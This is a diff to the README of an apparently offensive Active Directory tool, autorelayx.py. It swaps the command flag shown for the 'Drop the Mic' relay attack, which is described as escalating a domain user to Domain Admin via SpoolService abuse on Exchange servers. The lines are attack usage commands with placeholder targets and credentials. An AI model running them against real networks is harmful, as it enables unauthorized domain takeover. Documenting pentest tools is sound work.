@@ -43,9 +43,9 @@ Responder and mitm6. The -d <domain> is optional but suggested to use to limit m
 Escalate a domain user that you have the password for to Domain Admin. Script will test the exchange server(s) for 
 vulnerability to SpoolService RPC abuse for the Drop the Mic attack.
 
-```python autorelayx.py --printerbug -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -sf <exchange_servers.txt>```
+```python autorelayx.py --remove-mic -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -sf <exchange_servers.txt>```
 
-```python autorelayx.py --printerbug -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -s <Exchange IP/hostname>```
+```python autorelayx.py --remove-mic -dc <domain controller IP/hostname> -u <DOMAIN/user:password> -s <Exchange IP/hostname>```
 
 ## PrivExchange
 Escalate a domain user that you have the password for to Domain Admin.
